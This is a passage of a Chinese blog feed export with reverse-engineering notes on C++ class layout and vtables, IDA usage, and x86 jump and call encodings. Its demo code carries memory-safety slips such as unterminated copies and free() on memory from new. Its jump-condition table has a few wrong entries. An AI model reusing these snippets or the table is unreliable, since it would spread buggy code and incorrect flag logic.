<span class="hljs-string">&quot;tom&quot;</span>)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;high = high;<br>&#125;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">char</span> high;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bottom</span><br>:<span class="hljs-keyword">public</span> Mid1, Mid2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Bottom</span>(<span class="hljs-type">char</span>* grade, <span class="hljs-type">char</span>* name)<br>:<span class="hljs-built_in">Mid1</span>(<span class="hljs-number">20</span>), <span class="hljs-built_in">Mid2</span>(<span class="hljs-number">185</span>)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;grade = grade;<br><span class="hljs-keyword">this</span>-&gt;sName = name;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; age &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">char</span>* grade;<br><span class="hljs-type">char</span>* sName;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">Bottom <span class="hljs-title">obj</span><span class="hljs-params">(<span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;xiaoming&quot;</span>)</span></span>;<br>obj.<span class="hljs-built_in">show</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>继承关系呈现菱形结构，就是有两个类继承自同一个类，同时又有另外一个类同时继承自这两个。多重继承会在子类中出现<strong>多个父类的members结构</strong>，并根据先后顺序排列，可以从最上层依次分析，逐渐向下递进，直至分析出继承树结构。</p><p><strong>多重继承结构体定义标准模板</strong></p><p><img src="/2022/09/14/class-reverse/image-20220914173422053.png" alt="多重继承结构定义模板"></p><h3 id="1-4-虚表类"><a href="#1-4-虚表类" class="headerlink" title="1.4 虚表类"></a>1.4 虚表类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base1</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base1</span>(<span class="hljs-type">char</span>* str)<br>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>pa = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[len];<br><span class="hljs-built_in">strcpy</span>(pa, str);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;Base1&quot;</span> &lt;&lt; std::endl;<br>std::cout &lt;&lt; pa &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Base1</span>()<br>&#123;<br><span class="hljs-keyword">if</span> (pa)<br>&#123;<br><span class="hljs-built_in">free</span>(pa);<br>pa = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">char</span>* pa;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base2</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base2</span>(<span class="hljs-type">int</span> a)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;a = a;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; a &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Base2</span>()<br>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;destory Base2&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> a;<br>&#125;;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span><br>:<span class="hljs-keyword">public</span> Base1, <span class="hljs-keyword">public</span> Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A1</span>()<br>:<span class="hljs-built_in">Base1</span>(<span class="hljs-string">&quot;Hello&quot;</span>), <span class="hljs-built_in">Base2</span>(<span class="hljs-number">5</span>)<br>&#123;<br><span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;World&quot;</span>);<br><span class="hljs-keyword">this</span>-&gt;a = a;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;A1&quot;</span> &lt;&lt; std::endl;<br>std::cout &lt;&lt; buf &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">A1</span>()<br>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;A1 destory&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> a;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>A1 a1;<br>Base1* p = &amp;a1;<br>p-&gt;<span class="hljs-built_in">show</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>虚表指针属于基类，不属于子类，子类只是将其继承过来。</strong>所以在子类的结构中应包含父类的结构，在父类的结构中包含虚表结构和父类成员结构。多个父类结构在子类结构中顺序排列。</p><p><strong>多重继承虚表结构定义标准模板</strong></p><p><img src="/2022/09/14/class-reverse/image-20220914162409783.png" alt="多重继承下的虚表结构模板"></p><h2 id="2-对象创建方式"><a href="#2-对象创建方式" class="headerlink" title="2.对象创建方式"></a>2.对象创建方式</h2><h3 id="2-1-局部对象"><a href="#2-1-局部对象" class="headerlink" title="2.1 局部对象"></a>2.1 局部对象</h3><p>局部对象是最常见的创建方式，反汇编可以看见直接将栈内存地址传给构造函数。</p><p><img src="/2022/09/14/class-reverse/image-20220914181153384.png" alt="局部对象创建"></p><h3 id="2-2-堆对象"><a href="#2-2-堆对象" class="headerlink" title="2.2 堆对象"></a>2.2 堆对象</h3><p>对象存在new关键字动态申请出来的内存中，反汇编可以看见直接将new得到的地址传入构造函数。</p><p><img src="/2022/09/14/class-reverse/image-20220914181409983.png" alt="堆对象创建"></p><h3 id="2-3-全局对象和静态对象"><a href="#2-3-全局对象和静态对象" class="headerlink" title="2.3 全局对象和静态对象"></a>2.3 全局对象和静态对象</h3><p>对于全局对象和静态对象，都是在.data段分配内存，区别就是静态对象说明对象作用域在当前文件中。识别全局对象的调用可以寻找 lea rcx, qword_xxx 指令。</p><p>全局对象的构造函数在main函数前完成，在 crt-&gt;initterm 中完成初始化。</p><p><img src="/2022/09/14/class-reverse/image-20220915114054354.png" alt="initterm"></p><p>可以在First到Last区间内找到所有的代理构造函数地址，代理构造函数负责调用构造函数完成初始化以及调用 atexit 函数来注册析构函数，以便在main函数结束后调用。</p><p><img src="/2022/09/14/class-reverse/image-20220915114452944.png" alt="代理构造函数"></p><h3 id="2-4-参数对象"><a href="#2-4-参数对象" class="headerlink" title="2.4 参数对象"></a>2.4 参数对象</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">char</span> b)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_dwVal1 = a;<br><span class="hljs-keyword">this</span>-&gt;m_cVal2[<span class="hljs-number">5</span>] = b;<br>&#125;<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">const</span> A1&amp; c)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_dwVal1 = c.m_dwVal1;<br><span class="hljs-built_in">strcpy</span>(<span class="hljs-keyword">this</span>-&gt;m_cVal2, c.m_cVal2);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; <span class="hljs-keyword">this</span>-&gt;m_dwVal1 &lt;&lt; std::endl;<br>std::cout &lt;&lt; <span class="hljs-keyword">this</span>-&gt;m_cVal2[<span class="hljs-number">8</span>] &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_dwVal1;<br><span class="hljs-type">char</span> m_cVal2[<span class="hljs-number">20</span>];<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Show</span><span class="hljs-params">(A1 arg)</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; arg.m_cVal2[<span class="hljs-number">3</span>] &lt;&lt; std::endl;<br>arg.<span class="hljs-built_in">show</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-function">A1 <span class="hljs-title">a1</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)</span></span>;<br><span class="hljs-built_in">Show</span>(a1);<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用拷贝构造函数或直接复制对象空间内存来在参数区构造一个新的对象，并将新对象的内存首地址给调用的函数。</p><p><img src="/2022/09/14/class-reverse/image-20220915144147889.png" alt="参数对象传递"></p><h3 id="2-5-返回对象"><a href="#2-5-返回对象" class="headerlink" title="2.5 返回对象"></a>2.5 返回对象</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A1</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">char</span> b)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_dwVal1 = a;<br><span class="hljs-keyword">this</span>-&gt;m_cVal2[<span class="hljs-number">5</span>] = b;<br>&#125;<br><span class="hljs-built_in">A1</span>(<span class="hljs-type">const</span> A1&amp; c)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_dwVal1 = c.m_dwVal1;<br><span class="hljs-built_in">strcpy</span>(<span class="hljs-keyword">this</span>-&gt;m_cVal2, c.m_cVal2);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>std::cout &lt;&lt; <span class="hljs-keyword">this</span>-&gt;m_dwVal1 &lt;&lt; std::endl;<br>std::cout &lt;&lt; <span class="hljs-keyword">this</span>-&gt;m_cVal2[<span class="hljs-number">8</span>] &lt;&lt; std::endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_dwVal1;<br><span class="hljs-type">char</span> m_cVal2[<span class="hljs-number">20</span>];<br>&#125;;<br><br><span class="hljs-function">A1 <span class="hljs-title">Show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">A1 <span class="hljs-title">a1</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)</span></span>;<br><span class="hljs-keyword">return</span> a1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>A1 a1 = <span class="hljs-built_in">Show</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对象作为返回值传递会先在调用之前将缓冲区首地址提前传进去（即使那个函数没有参数）。</p><p><img src="/2022/09/14/class-reverse/image-20220915145145190.png" alt="main函数"></p><p>在函数里面调用构造函数，在函数返回前根据传进来的上一个函数缓冲区的首地址和当前这个对象的首地址作为参数来调用拷贝构造函数。</p><p><img src="/2022/09/14/class-reverse/image-20220915145215817.png" alt="Show函数"></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ida基础用法</title>
      <link href="/2022/09/13/ida-basic/"/>
      <url>/2022/09/13/ida-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="1-常用快捷键"><a href="#1-常用快捷键" class="headerlink" title="1.常用快捷键"></a>1.常用快捷键</h2><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>Shift + F12</td><td>打开字符串窗口</td></tr><tr><td>Y</td><td>改变函数原型或变量类型</td></tr><tr><td>D</td><td>宽度转换以及结构体中新增成员</td></tr><tr><td>R</td><td>字符转换</td></tr><tr><td>H</td><td>进制转换</td></tr><tr><td>&#x2F;</td><td>伪代码中添加注释</td></tr><tr><td>X</td><td>查看交叉引用</td></tr><tr><td>TAB</td><td>汇编指令和伪代码之间切换</td></tr><tr><td>Shift + E</td><td>得到数组</td></tr><tr><td>Alt + T</td><td>搜索字符串</td></tr><tr><td>Alt + I</td><td>搜索立即数</td></tr><tr><td>Alt + B</td><td>搜索二进制</td></tr><tr><td>Alt + P</td><td>修改函数边界</td></tr></tbody></table><h2 id="2-伪代码修复"><a href="#2-伪代码修复" class="headerlink" title="2.伪代码修复"></a>2.伪代码修复</h2><h3 id="2-1-逆向命名规则"><a href="#2-1-逆向命名规则" class="headerlink" title="2.1 逆向命名规则"></a>2.1 逆向命名规则</h3><h4 id="2-1-1-类型命名"><a href="#2-1-1-类型命名" class="headerlink" title="2.1.1 类型命名"></a><strong>2.1.1 类型命名</strong></h4><table><thead><tr><th>类型</th><th>前缀</th></tr></thead><tbody><tr><td>数组</td><td>a</td></tr><tr><td>布尔</td><td>b</td></tr><tr><td>字符byte</td><td>c</td></tr><tr><td>短整型word</td><td>w</td></tr><tr><td>整型dowrd</td><td>dw</td></tr><tr><td>整形qword</td><td>qw</td></tr><tr><td>指针</td><td>p</td></tr><tr><td>类成员</td><td>m_</td></tr><tr><td>字符串</td><td>sz</td></tr></tbody></table><h4 id="2-1-2-符号命名"><a href="#2-1-2-符号命名" class="headerlink" title="2.1.2 符号命名"></a><strong>2.1.2 符号命名</strong></h4><table><thead><tr><th>符号类型</th><th>规则</th><th>示例</th></tr></thead><tbody><tr><td>栈变量</td><td>类型前缀 + 名字</td><td>szWelcome</td></tr><tr><td>全局变量</td><td>g_类型前缀 + 名字</td><td>g_dwTime</td></tr><tr><td>普通函数</td><td>大功能 + 具体功能</td><td>memAlloc</td></tr><tr><td>成员函数</td><td>类名字::函数名</td><td>Student::getNum</td></tr></tbody></table><h3 id="2-2-不规则代码"><a href="#2-2-不规则代码" class="headerlink" title="2.2 不规则代码"></a>2.2 不规则代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">LOBYTE</span><span class="hljs-params">(x)</span>:     <span class="hljs-keyword">return</span> x &amp; 0xff<br>def <span class="hljs-title function_">HIBYTE</span><span class="hljs-params">(x)</span>:     <span class="hljs-title function_">return</span> <span class="hljs-params">(x &gt;&gt; <span class="hljs-number">8</span>)</span> &amp; 0xff<br>def <span class="hljs-title function_">LOWORD</span><span class="hljs-params">(x)</span>:     <span class="hljs-keyword">return</span> x &amp; 0xffff<br>def <span class="hljs-title function_">HIWORD</span><span class="hljs-params">(x)</span>:     <span class="hljs-title function_">return</span> <span class="hljs-params">(x &gt;&gt; <span class="hljs-number">16</span>)</span> &amp; 0xffff<br>def <span class="hljs-title function_">LODWORD</span><span class="hljs-params">(x)</span>:    <span class="hljs-keyword">return</span> x &amp; 0xffffffff<br>def <span class="hljs-title function_">HIDWORD</span><span class="hljs-params">(x)</span>:    <span class="hljs-title function_">return</span> <span class="hljs-params">(x &gt;&gt; <span class="hljs-number">32</span>)</span> &amp; 0xffffffff<br></code></pre></td></tr></table></figure><h3 id="2-3-修复函数原型"><a href="#2-3-修复函数原型" class="headerlink" title="2.3 修复函数原型"></a>2.3 修复函数原型</h3><h4 id="2-3-1-返回值类型"><a href="#2-3-1-返回值类型" class="headerlink" title="2.3.1 返回值类型"></a>2.3.1 返回值类型</h4><p>​当分析出某个函数的返回值类型始终（交叉引用）不会被使用后，可以将函数原型的返回值类型改成void，可以优化掉多余代码。</p><h4 id="2-3-2-参数个数和类型"><a href="#2-3-2-参数个数和类型" class="headerlink" title="2.3.2 参数个数和类型"></a>2.3.2 参数个数和类型</h4><p>​在x64下，有些函数没有参数，但由于调用约定，F5后的伪代码中可能出现参数，将多余的参数删除，可以优化代码。而且有些参数是使用寄存器传递，如浮点寄存器，这时伪代码中可能无法正确识别，需要结合汇编分析，并手动添加参数，可以增加可读性。</p><h3 id="2-4-修复变量类型"><a href="#2-4-修复变量类型" class="headerlink" title="2.4 修复变量类型"></a>2.4 修复变量类型</h3><h4 id="2-4-1-结构体定义"><a href="#2-4-1-结构体定义" class="headerlink" title="2.4.1 结构体定义"></a>2.4.1 结构体定义</h4><p>​恢复结构体类型可以大大代码可读性，可以根据new的大小和分析成员使用情况来确定结构体边界和成员类型。下面展示类的结构定义模板：</p><p><img src="/2022/09/13/ida-basic/image-20220913182821578.png" alt="类结构模板"></p><h4 id="2-4-2-数组定义"><a href="#2-4-2-数组定义" class="headerlink" title="2.4.2 数组定义"></a>2.4.2 数组定义</h4><p>​对于连续的内存空间的操作，可以酌情还原为数组，增加可读性。</p><h2 id="3-符号还原"><a href="#3-符号还原" class="headerlink" title="3.符号还原"></a>3.符号还原</h2><h3 id="3-1-基于签名文件的符号还原"><a href="#3-1-基于签名文件的符号还原" class="headerlink" title="3.1 基于签名文件的符号还原"></a>3.1 基于签名文件的符号还原</h3><h3 id="3-2-基于Bindff的符号还原"><a href="#3-2-基于Bindff的符号还原" class="headerlink" title="3.2 基于Bindff的符号还原"></a>3.2 基于Bindff的符号还原</h3>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令基础</title>
      <link href="/2022/09/12/asm-basic/"/>
      <url>/2022/09/12/asm-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="1-EFLAGS"><a href="#1-EFLAGS" class="headerlink" title="1.EFLAGS"></a>1.EFLAGS</h2><p><img src="/2022/09/12/asm-basic/eflags.png" alt="eflags"></p><h2 id="2-测试与比较"><a href="#2-测试与比较" class="headerlink" title="2.测试与比较"></a>2.测试与比较</h2><h3 id="2-1-test"><a href="#2-1-test" class="headerlink" title="2.1 test"></a>2.1 test</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">test rax, rbx<br>; 等价形式如下<br>push rax<br>and rax, rbx<br>pop rax<br></code></pre></td></tr></table></figure><h3 id="2-2-cmp"><a href="#2-2-cmp" class="headerlink" title="2.2 cmp"></a>2.2 cmp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp rax, rbx<br>; 等价形式如下<br>push rax<br>sub rax, rbx<br>pop rax<br></code></pre></td></tr></table></figure><h2 id="3-跳转"><a href="#3-跳转" class="headerlink" title="3.跳转"></a>3.跳转</h2><h3 id="3-1-JCC条件跳转"><a href="#3-1-JCC条件跳转" class="headerlink" title="3.1 JCC条件跳转"></a>3.1 JCC条件跳转</h3><ul><li><strong>短跳：</strong>2字节，1字节硬编码 + 1字节有符号偏移</li><li><strong>长跳：</strong>6字节，2字节硬编码 + 4字节有符号地址</li></ul><table><thead><tr><th>指令</th><th>短跳</th><th>长跳</th><th>含义</th><th>EFLAGS</th></tr></thead><tbody><tr><td>JZ&#x2F;JE</td><td>0x74</td><td>0x0F 0x84</td><td>相等则跳转</td><td>ZF &#x3D;&#x3D; 1</td></tr><tr><td>JNZ&#x2F;JNE</td><td>0x75</td><td>0x0F 0x85</td><td>不相等则跳转</td><td>ZF &#x3D;&#x3D; 0</td></tr><tr><td>JS</td><td>0x78</td><td>0x0F 0x88</td><td>负数则跳转</td><td>SF &#x3D;&#x3D; 1</td></tr><tr><td>JNS</td><td>0x79</td><td>0x0F 0x89</td><td>正数则跳转</td><td>SF &#x3D;&#x3D; 0</td></tr><tr><td>JP&#x2F;JPE</td><td>0x7A</td><td>0x0F 0x8A</td><td>1出现次数为偶数则跳转</td><td>PF &#x3D;&#x3D; 1</td></tr><tr><td>JNP&#x2F;JPO</td><td>0x7B</td><td>0x0F 0x8B</td><td>1出现次数为奇数则跳转</td><td>PF &#x3D;&#x3D; 0</td></tr><tr><td>JC&#x2F;JB&#x2F;JNAE</td><td>0x72</td><td>0x0F 0x82</td><td>无符号数 (进位)低于则跳转</td><td>CF &#x3D;&#x3D; 1</td></tr><tr><td>JNC&#x2F;JNB&#x2F;JAE</td><td>0x73</td><td>0x0F 0x83</td><td>无符号数 (不进位)高于等于则跳转</td><td>CF &#x3D;&#x3D; 0</td></tr><tr><td>JO</td><td>0x70</td><td>0x0F 0x80</td><td>有符号数 溢出则跳转</td><td>OF &#x3D;&#x3D; 1</td></tr><tr><td>JNO</td><td>0x71</td><td>0x0F 0x81</td><td>有符号数 无溢出则跳转</td><td>OF &#x3D;&#x3D; 0</td></tr><tr><td>JBE&#x2F;JNA</td><td>0x76</td><td>0x0F 0x86</td><td>无符号数 低于等于则跳转</td><td>ZF &#x3D;&#x3D; 1 || CF &#x3D;&#x3D; 1</td></tr><tr><td>JNBE&#x2F;JA</td><td>0x77</td><td>0x0F 0x87</td><td>无符号数 高于则跳转</td><td>ZF &#x3D;&#x3D; 0 || CF &#x3D;&#x3D; 0</td></tr><tr><td>JL&#x2F;JNGE</td><td>0x7C</td><td>0x0F 0x8C</td><td>有符号数 小于则跳转</td><td>SF !&#x3D; OF</td></tr><tr><td>JNL&#x2F;JGE</td><td>0x7D</td><td>0x0F 0x8D</td><td>有符号数 大于等于则跳转</td><td>SF &#x3D;&#x3D; OF</td></tr><tr><td>JLE&#x2F;JNG</td><td>0x7E</td><td>0x0F 0x8E</td><td>有符号数 小于等于则跳转</td><td>ZF !&#x3D; OF || ZF &#x3D;&#x3D; 1</td></tr><tr><td>JNLE&#x2F;JG</td><td>0x7F</td><td>0x0F 0x8F</td><td>有符号数 大于则跳转</td><td>SF &#x3D;&#x3D; 0F &amp;&amp; ZF &#x3D;&#x3D; 0</td></tr></tbody></table><h3 id="3-2-CALL无条件跳转"><a href="#3-2-CALL无条件跳转" class="headerlink" title="3.2 CALL无条件跳转"></a>3.2 CALL无条件跳转</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E8</span> + <span class="hljs-number">4</span>字节有符号偏移：偏移CALL，最常见用法。<br></code></pre></td></tr></table></figure><p><strong>跳转目标地址 &#x3D; 当前指令地址 + 当前指令长度 + 4字节偏移</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**FF 15 + 4字节：**</span>间接CALL，长用于调用导入表中函数。<br></code></pre></td></tr></table></figure><ul><li><p>x86：后面跟4字节内存地址。</p><p><strong>跳转目标地址 &#x3D; ptr:[ 4字节内存地址 ]</strong></p></li><li><p>x64：后面跟4字节偏移，再使用偏移计算公式得到4字节内存地址。</p></li></ul><p>​<strong>跳转目标地址 &#x3D; ptr:[ 当前指令地址 + 当前指令长度 + 4字节偏移 ]</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">9A + <span class="hljs-number">4</span>字节地址 + 目标<span class="hljs-built_in">cs</span>：绝对<span class="hljs-keyword">CALL</span>，仅x86有效，可以跳转到绝对地址同时改变<span class="hljs-built_in">cs</span>的值，<span class="hljs-built_in">far</span>常用于实现调用门。<br></code></pre></td></tr></table></figure><p>​<strong>跳转目标地址 &#x3D; 4字节地址、cs &#x3D; 目标cs</strong></p><h3 id="3-3-JMP无条件跳转"><a href="#3-3-JMP无条件跳转" class="headerlink" title="3.3 JMP无条件跳转"></a>3.3 JMP无条件跳转</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">EB</span> + <span class="hljs-number">1</span>字节有符号偏移：偏移短跳转<br></code></pre></td></tr></table></figure><p>​<strong>跳转目标地址 &#x3D; 当前指令地址 + 当前指令长度 + 1字节偏移</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 